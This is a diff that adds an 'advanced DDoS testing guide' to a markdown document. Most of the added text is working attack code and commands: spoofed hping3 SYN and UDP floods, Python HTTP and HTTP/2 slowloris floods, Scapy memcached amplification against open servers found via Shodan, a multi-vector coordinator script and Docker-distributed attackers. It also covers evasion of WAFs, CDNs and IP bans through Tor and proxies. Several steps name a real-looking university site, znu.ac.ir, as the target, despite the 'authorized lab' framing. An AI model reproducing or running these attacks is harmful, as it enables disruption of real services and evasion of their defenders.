@@ -1,4 +1,4 @@
-# DDoS Target Analysis and Attack Method Selection: Educational Guide
+# LEVELDDoS Target Analysis and Attack Method Selection: Educational Guide
 
 ## 1. Understanding Your Target
 
@@ -994,12 +994,15 @@ To avoid detection during these advanced attacks:
 ## 4. Testing in Your Lab
 
 - **Setup**:
+
   - Kali VM (attacker), Ubuntu VM (target with Apache, BIND9, Memcached), host-only network.
   - Install Snort on the target to simulate IDS:
     ```bash
     sudo apt-get install snort
     ```
+
 - **Test Workflow**:
+
   1. Launch a multi-vector attack (SYN + HTTP + DNS).
   2. Monitor with Wireshark:
      ```bash
@@ -1010,9 +1013,532 @@ To avoid detection during these advanced attacks:
      sudo cat /var/log/snort/alert
      ```
   4. Verify anonymity (no real IP/MAC in logs).
+
 - **Mitigation Practice**:
+
   - Apply `iptables` rate limiting:
     ```bash
     iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/second -j ACCEPT
     ```
   - Test if attacks are blocked.
+  -
+  -
+
+  # Advanced DDoS Testing Guide with Kali Linux Tools
+
+  This guide details the best DDoS tools in Kali Linux for testing server vulnerabilities in an authorized environment. It covers their protocols, usage for maximum efficiency and impact, combinations for multi-vector attacks, and strategies to bypass defenses like WAFs, CDNs, and rate-limiting.
+
+  ## 1. Overview of DDoS Tools in Kali Linux
+
+  Kali Linux offers a range of powerful tools for simulating DDoS attacks, each targeting different layers of the network stack (Layer 3/4 for network floods, Layer 7 for application attacks). The best tools for high-impact testing include:
+
+  - **hping3** : Crafts custom TCP/UDP packets for floods and amplification attacks.
+  - **Slowloris** : Exhausts server connections with partial HTTP requests.
+  - **slowhttptest** : Simulates slow HTTP attacks (e.g., Slowloris, Slow POST).
+  - **LOIC (Low Orbit Ion Cannon)** : Generates high-volume HTTP, TCP, or UDP floods.
+  - **Torshammer** : Performs slow HTTP POST attacks, evading detection.
+  - **GoldenEye** : Targets Layer 7 with randomized HTTP requests.
+  - **sqlmap** : Can be used for database stress testing (pseudo-DDoS via heavy queries).
+  - **Custom Scripts (Python/Scapy)** : For tailored attacks like amplification or multi-vector.
+
+  ## 2. Protocols and Attack Types
+
+  DDoS attacks leverage various protocols to overwhelm different server resources:
+
+  - **TCP (Layer 4)** : SYN floods, ACK floods, RST floods (e.g., `hping3`).
+  - **UDP (Layer 4)** : Amplification attacks (e.g., DNS, Memcached, NTP via Scapy).
+  - **HTTP/HTTPS (Layer 7)** : HTTP floods, slow attacks, cache-busting (e.g., Slowloris, GoldenEye).
+  - **ICMP** : Ping floods to consume bandwidth (e.g., `hping3`).
+  - **Application-Specific** : Database query floods (e.g., `sqlmap` with heavy SQL payloads).
+
+    **Maximizing Damage** :
+
+  - Combine protocols (e.g., TCP + HTTP) to overload multiple server components (network, CPU, memory).
+  - Use amplification for massive bandwidth consumption.
+  - Target weak points: database connections, low timeout settings, or unoptimized APIs.
+
+  ## 3. Tool-by-Tool Usage and Efficiency
+
+  ### 3.1 hping3
+
+  **Purpose** : Craft custom TCP/UDP/ICMP packets for floods or amplification.
+
+  - **Protocols** : TCP, UDP, ICMP.
+  - **Strengths** : Precise control over packet structure, supports spoofing, high-speed floods.
+  - **Usage** :
+  - **SYN Flood** (overwhelms connection table):
+
+    ```bash
+    hping3 -S -p 80 --flood --rand-source <target_ip>
+    ```
+
+    - `-S`: SYN packets.
+    - `--flood`: Maximum speed.
+    - `--rand-source`: Spoof random source IPs.
+
+  - **UDP Flood** (consumes bandwidth):
+
+    ```bash
+    hping3 -2 -c 10000 -p 53 --flood <target_ip>
+    ```
+
+    - `-2`: UDP mode.
+    - `-c 10000`: Send 10,000 packets.
+
+  - **Amplification Test** (e.g., DNS):
+
+    ```bash
+    hping3 -2 -p 53 --spoof <victim_ip> --data 40 <dns_server_ip>
+    ```
+
+    - Spoof victim’s IP to send large DNS responses.
+
+  - **Efficiency Tips** :
+  - Use `--rand-source` to evade IP-based filtering.
+  - Target specific ports (e.g., 80, 443, 53) based on server services.
+  - Combine with other tools for multi-vector attacks.
+  - **Defense Bypass** :
+  - Spoofed IPs bypass rate-limiting.
+  - UDP-based attacks evade TCP-focused firewalls.
+
+  ### 3.2 Slowloris
+
+  **Purpose** : Exhaust server connections with partial HTTP requests.
+
+  - **Protocols** : HTTP/HTTPS (Layer 7).
+  - **Strengths** : Low bandwidth, stealthy, effective against Apache with default settings.
+  - **Usage** :
+  - Command:
+
+    ```bash
+    slowloris -dns <target_domain> -port 80 -timeout 2000 -num 500
+    ```
+
+    - `-num 500`: Open 500 connections.
+    - `-timeout 2000`: Keep connections alive for 2 seconds.
+
+  - **Python Alternative** (for HTTP/2):
+
+    ```python
+    import h2.connection
+    import socket
+    import time
+
+    def slowloris_http2(target, port=443, connections=500):
+        socks = []
+        for _ in range(connections):
+            sock = socket.create_connection((target, port))
+            conn = h2.connection.H2Connection()
+            conn.initiate_connection()
+            sock.sendall(conn.data_to_send())
+            stream_id = conn.get_next_available_stream_id()
+            headers = [(":method", "GET"), (":path", "/"), (":scheme", "https"), (":authority", target)]
+            conn.send_headers(stream_id, headers, end_stream=False)
+            socks.append((sock, conn))
+        while True:
+            for sock, conn in socks:
+                sock.sendall(conn.data_to_send())
+                time.sleep(1)
+
+    target = "target_server"  # Replace with target
+    slowloris_http2(target)
+    ```
+
+  - **Efficiency Tips** :
+  - Increase `-num` to match server’s connection limit (check with `netstat`).
+  - Use HTTPS (`-port 443`) to target secure servers.
+  - Run multiple instances from different IPs (e.g., VMs) for scale.
+  - **Defense Bypass** :
+  - HTTP/2 bypasses legacy WAFs that don’t parse modern protocols.
+  - Slow requests evade rate-limiting by staying under thresholds.
+
+  ### 3.3 slowhttptest
+
+  **Purpose** : Simulate slow HTTP attacks (Slowloris, Slow POST, Slow Read).
+
+  - **Protocols** : HTTP/HTTPS (Layer 7).
+  - **Strengths** : Configurable attack types, stealthy, targets specific server weaknesses.
+  - **Usage** :
+  - **Slowloris Mode** :
+    `bash slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://<target_ip> -x 24 `
+
+    \*`-c 1000`: 1,000 connections.
+
+    - `-H`: Slowloris mode.
+    - `-i 10`: 10ms interval for sending headers.
+
+  - **Slow POST** :
+    `bash slowhttptest -c 1000 -B -i 10 -r 200 -t POST -u http://<target_ip>/form `
+
+    \*`-B`: Slow POST mode.
+
+    - Targets form endpoints (e.g., login or search forms).
+
+  - **Efficiency Tips** :
+  - Identify target’s connection limit (e.g., Apache’s `MaxClients`) and exceed it.
+  - Test POST endpoints (e.g., feedback forms) for higher impact.
+  - Use `-x 24` to send larger payloads for CPU exhaustion.
+  - **Defense Bypass** :
+  - Slow attacks evade behavioral detection by mimicking legitimate traffic.
+  - POST attacks target dynamic endpoints that bypass CDNs.
+
+  ### 3.4 LOIC (Low Orbit Ion Cannon)
+
+  **Purpose** : Generate high-volume HTTP, TCP, or UDP floods.
+
+  - **Protocols** : HTTP, TCP, UDP.
+  - **Strengths** : Simple to use, high traffic volume, supports distributed attacks.
+  - **Usage** :
+  - Command:
+
+    ```bash
+    loic
+    ```
+
+    - GUI-based: Enter target URL/IP, select method (HTTP, TCP, UDP), and start.
+    - HTTP Flood: `http://<target_domain>`, 1000 threads.
+    - TCP Flood: Target port 80, max sockets.
+
+  - **CLI Alternative** (custom Python for HTTP flood):
+
+    ```python
+    import requests
+    import threading
+
+    def http_flood(target, threads=100):
+        def attack():
+            while True:
+                try:
+                    requests.get(target, timeout=5)
+                except:
+                    pass
+        for _ in range(threads):
+            threading.Thread(target=attack).start()
+
+    target = "http://target_server"
+    http_flood(target)
+    ```
+
+  - **Efficiency Tips** :
+  - Run LOIC from multiple VMs to simulate a botnet.
+  - Target specific endpoints (e.g., `/search`) to overload application logic.
+  - Combine with UDP floods for multi-vector impact.
+  - **Defense Bypass** :
+  - High-volume requests overwhelm rate-limiting.
+  - Randomized URLs (`/page?rand=123`) bypass CDN caching.
+
+  ### 3.5 Torshammer
+
+  **Purpose** : Slow HTTP POST attacks to exhaust server resources.
+
+  - **Protocols** : HTTP/HTTPS (Layer 7).
+  - **Strengths** : Stealthy, targets form endpoints, uses Tor for anonymity.
+  - **Usage** :
+  - Command:
+
+    ```bash
+    torshammer.py -t <target_domain> -p 80 -r 1000 -T
+    ```
+
+    - `-t`: Target domain/IP.
+    - `-r 1000`: 1,000 connections.
+    - `-T`: Use Tor for anonymity.
+
+  - **Tor Setup** :
+    `bash service tor start proxychains python3 torshammer.py -t <target_domain> -p 80 -r 1000 `
+  - **Efficiency Tips** :
+  - Target login or feedback forms (e.g., `/contact` from the ZNU site).
+  - Increase connections (`-r`) to match server limits.
+  - Run multiple instances with different Tor circuits.
+  - **Defense Bypass** :
+  - Tor anonymizes source IPs, evading IP bans.
+  - Slow POSTs mimic legitimate form submissions.
+
+  ### 3.6 GoldenEye
+
+  **Purpose** : Layer 7 HTTP floods with randomized requests to bypass caching.
+
+  - **Protocols** : HTTP/HTTPS.
+  - **Strengths** : Generates dynamic, cache-busting requests, high CPU load.
+  - **Usage** :
+  - Command:
+
+    ```bash
+    goldeneye.py http://<target_domain> -w 100 -s 500
+    ```
+
+    - `-w 100`: 100 worker threads.
+    - `-s 500`: 500 sockets per thread.
+
+  - **Python Alternative** (cache-busting):
+
+    ```python
+    import requests
+    import random
+    import threading
+
+    def goldeneye_flood(target, threads=100):
+        def attack():
+            while True:
+                try:
+                    url = f"{target}?rand={random.randint(1, 100000)}"
+                    headers = {"User-Agent": f"Mozilla/5.0 {random.randint(1, 100)}"}
+                    requests.get(url, headers=headers, timeout=5)
+                except:
+                    pass
+        for _ in range(threads):
+            threading.Thread(target=attack).start()
+
+    target = "http://target_server"
+    goldeneye_flood(target)
+    ```
+
+  - **Efficiency Tips** :
+  - Target dynamic endpoints (e.g., `/search` or `/news` from ZNU).
+  - Randomize headers and query parameters to evade CDNs.
+  - Scale threads based on target’s capacity.
+  - **Defense Bypass** :
+  - Cache-busting URLs hit the origin server, overloading it.
+  - Randomized headers evade WAF fingerprinting.
+
+  ### 3.7 sqlmap for Pseudo-DDoS
+
+  **Purpose** : Stress database with heavy SQL queries, simulating application-layer DDoS.
+
+  - **Protocols** : HTTP/HTTPS (Layer 7).
+  - **Strengths** : Targets database bottlenecks, stealthy as it mimics legitimate queries.
+  - **Usage** :
+  - Command:
+
+    ```bash
+    sqlmap -u "http://<target_domain>/news?id=123" --stress --threads=10
+    ```
+
+    - `--stress`: Sends heavy queries to overload database.
+    - `--threads=10`: Max threads for parallel requests.
+
+  - **Efficiency Tips** :
+  - Identify database-backed endpoints (e.g., search or news pages).
+  - Use `--delay` to slow requests and evade rate-limiting.
+  - Combine with HTTP floods for dual impact.
+  - **Defense Bypass** :
+  - Legitimate-looking queries bypass WAFs.
+  - Heavy queries exhaust database connections, not just web server.
+
+  ### 3.8 Custom Scripts with Scapy
+
+  **Purpose** : Craft amplification or protocol-specific attacks (e.g., Memcached, QUIC).
+
+  - **Protocols** : UDP, TCP, QUIC.
+  - **Strengths** : Fully customizable, supports emerging protocols.
+  - **Usage** (Memcached Amplification):
+
+    ```python
+    from scapy.all import *
+
+    def memcached_amplification(target_ip, memcached_server, count=1000):
+        packet = IP(dst=memcached_server, src=target_ip)/UDP(dport=11211)/Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
+        send(packet, count=count, verbose=0)
+        print(f"Sent {count} packets to {memcached_server}, spoofing {target_ip}")
+
+    target_ip = "victim_ip"  # Replace with target
+    memcached_server = "memcached_server_ip"  # Find via Shodan
+    memcached_amplification(target_ip, memcached_server)
+    ```
+
+  - **Efficiency Tips** :
+  - Find vulnerable servers using Shodan (`port:11211 memcached`).
+  - Increase `count` for higher impact.
+  - Combine with TCP floods for multi-protocol attack.
+  - **Defense Bypass** :
+  - UDP amplification bypasses TCP-focused defenses.
+  - Spoofed IPs evade IP-based mitigation.
+
+  ## 4. Combining Tools for Multi-Vector Attacks
+
+  **Objective** : Overwhelm server at multiple layers (network, application, database) to confuse defenses.
+
+  - **Strategy** :
+  - **Phase 1 (Network Flood)** : Use `hping3` for SYN/UDP floods to saturate bandwidth.
+  - **Phase 2 (Application Flood)** : Run Slowloris or GoldenEye to exhaust connections or CPU.
+  - **Phase 3 (Database Stress)** : Use `sqlmap --stress` to overload database.
+  - **Pulsing** : Alternate attacks (e.g., 10s flood, 5s pause) to evade behavioral detection.
+  - **Execution** :
+  - Script to coordinate attacks:
+    ```bash
+    # Start SYN flood
+    hping3 -S -p 80 --flood --rand-source <target_ip> &
+    sleep 10
+    pkill hping3
+    # Start Slowloris
+    slowloris -dns <target_domain> -port 80 -num 500 &
+    sleep 10
+    pkill slowloris
+    # Start GoldenEye
+    goldeneye.py http://<target_domain> -w 100 -s 500 &
+    sleep 10
+    pkill goldeneye
+    # Start sqlmap stress
+    sqlmap -u "http://<target_domain>/news?id=123" --stress --threads=10
+    ```
+  - **Python Coordinator** :
+
+    ```python
+    import subprocess
+    import time
+
+      def run_attack(command, duration):
+          process = subprocess.Popen(command, shell=True)
+          time.sleep(duration)
+          process.terminate()
+
+      target_ip = "target_ip"
+      target_domain = "target_domain"
+      attacks = [
+          (f"hping3 -S -p 80 --flood --rand-source {target_ip}", 10),
+          (f"slowloris -dns {target_domain} -port 80 -num 500", 10),
+          (f"goldeneye.py http://{target_domain} -w 100 -s 500", 10),
+          (f"sqlmap -u http://{target_domain}/news?id=123 --stress --threads=10", 10)
+      ]
+      for cmd, dur in attacks:
+          print(f"Running: {cmd}")
+          run_attack(cmd, dur)
+    ```
+
+  - **Efficiency Tips** :
+  - Use multiple VMs or Docker containers to distribute attack sources.
+  - Time attacks to overlap slightly for maximum load.
+  - Monitor server response with `curl` or Wireshark to adjust timing.
+  - **Defense Bypass** :
+  - Multi-vector attacks confuse AI-based anomaly detection.
+  - Pulsing evades thresholds for sustained traffic.
+
+  ## 5. Smart Evasion Tactics
+
+  - **IP Spoofing** :
+  - Use `hping3 --rand-source` or Scapy to spoof IPs.
+  - Rotate source IPs with proxies or Tor:
+
+    ```bash
+    proxychains slowloris -dns <target_domain> -port 80 -num 500
+    ```
+
+  - **WAF Evasion** :
+  - Randomize headers/user-agents in GoldenEye or Python scripts.
+  - Use HTTP/2 in Slowloris to exploit parsing weaknesses.
+  - Encode payloads in `sqlmap` with `--tamper=randomcase,space2comment`.
+  - **CDN Bypass** :
+  - Find origin IP with `dnsdumpster` or `subbrute`:
+
+    ```bash
+    subbrute.py znu.ac.ir > subdomains.txt
+    ```
+
+  - Target origin directly with `hping3` or GoldenEye.
+  - **Rate-Limiting Evasion** :
+  - Slow down requests (e.g., `sleep 2` in scripts).
+  - Distribute attacks across multiple IPs using Docker:
+
+    ```yaml
+    version: "3"
+    services:
+      attacker:
+        image: kalilinux/kali-rolling
+        command: slowloris -dns target_domain -port 80 -num 100
+        deploy:
+          replicas: 10
+    ```
+
+    ```bash
+    docker-compose up
+    ```
+
+  - **Behavioral Evasion** :
+  - Mimic legitimate traffic with randomized headers and delays.
+  - Use headless browsers (e.g., Puppeteer) for realistic HTTP floods:
+
+    ```python
+    from pyppeteer import launch
+    import asyncio
+
+    async def browser_flood(target, count=100):
+        browser = await launch(headless=True)
+        for _ in range(count):
+            page = await browser.newPage()
+            await page.setUserAgent(f"Mozilla/5.0 {random.randint(1, 100)}")
+            await page.goto(target)
+            await page.close()
+        await browser.close()
+
+    asyncio.run(browser_flood("http://target_server"))
+    ```
+
+  ## 6. Lab Setup and Monitoring
+
+  - **Environment** :
+  - **Target** : Ubuntu server with Apache/Nginx, MySQL, and a web app (e.g., DVWA).
+  - **Attacker** : Kali Linux with `hping3`, `slowloris`, `slowhttptest`, `loic`, `torshammer`, `goldeneye`, `sqlmap`, and Python/Scapy.
+  - **Monitoring** : Prometheus/Grafana for server metrics, Wireshark for traffic analysis.
+  - **Setup** :
+  - Deploy target server with a web app (e.g., WordPress to mimic ZNU’s CMS).
+  - Install tools on Kali:
+    ```bash
+    apt update && apt install hping3 slowhttptest torshammer python3-scapy
+    git clone https://github.com/dotfighter/torshammer.git
+    git clone https://github.com/Sheky/goldeneye.git
+    ```
+  - Configure Docker for distributed attacks:
+    ```bash
+    apt install docker.io docker-compose
+    ```
+  - **Monitoring** :
+  - Capture traffic: `tcpdump -i eth0 -w attack.pcap`
+  - Monitor server: Deploy Prometheus/Grafana to track CPU, memory, and bandwidth.
+  - Check logs: `/var/log/apache2/access.log`, `/var/log/mysql/mysql.log`.
+
+  ## 7. Testing Workflow
+
+  1. **Reconnaissance** :
+
+  - Identify target endpoints (e.g., `/news`, `/search` on `znu.ac.ir`).
+  - Use `dirb` or Burp Suite to find dynamic pages.
+
+  1. **Single-Vector Testing** :
+
+  - Test `hping3` SYN flood to check bandwidth limits.
+  - Run Slowloris to test connection limits.
+
+  1. **Multi-Vector Attack** :
+
+  - Combine `hping3`, Slowloris, and GoldenEye using the Python coordinator script.
+  - Add `sqlmap --stress` if database endpoints are found.
+
+  1. **Evasion Testing** :
+
+  - Use proxies/Tor with Torshammer.
+  - Test CDN bypass by targeting origin IP.
+
+  1. **Analysis** :
+
+  - Monitor server downtime or resource exhaustion.
+  - Check logs for successful attack indicators (e.g., 503 errors, database lag).
+
+  1. **Reporting** :
+
+  - Document vulnerable endpoints, attack success, and server weaknesses.
+  - Suggest mitigations (e.g., increase timeouts, deploy WAF, scale resources).
+
+  ## 8. Defense Recommendations
+
+  - **Network Layer** :
+  - Filter UDP traffic to block amplification.
+  - Implement SYN cookies to mitigate SYN floods.
+  - **Application Layer** :
+  - Increase connection timeouts (e.g., Apache `KeepAliveTimeout`).
+  - Use WAF rules for HTTP/2 and randomized headers.
+  - **CDN Protection** :
+  - Ensure all subdomains are proxied.
+  - Cache dynamic content where possible.
+  - **Database** :
+  - Optimize queries and limit connections.
+  - Use prepared statements to prevent `sqlmap` stress.
